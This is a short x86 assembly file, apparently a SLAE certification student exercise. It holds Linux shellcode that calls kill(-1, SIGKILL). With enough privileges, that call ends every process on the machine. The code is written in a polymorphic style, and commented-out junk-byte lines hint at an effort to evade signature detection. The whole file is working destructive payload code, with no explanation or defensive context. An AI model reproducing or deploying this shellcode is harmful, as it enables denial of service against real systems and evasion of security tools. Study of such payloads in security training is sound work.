; Student ID: SLAE – 871

global _start

section .text

_start:

  ; kill(-1, SIGKILL)
;xor edi, edi
;jmp $+3
;db 0xe8
push byte -1    ; 
pop ebx        ; 
mov dl, 8
mov cl, dl	; ECX contains 8
xchg dl, al	; EAX is 8
add al, 29	; EAX = 29 + 8 = 37
 inc ecx	; ECX = 8 + 1 = 9
 int 0x80
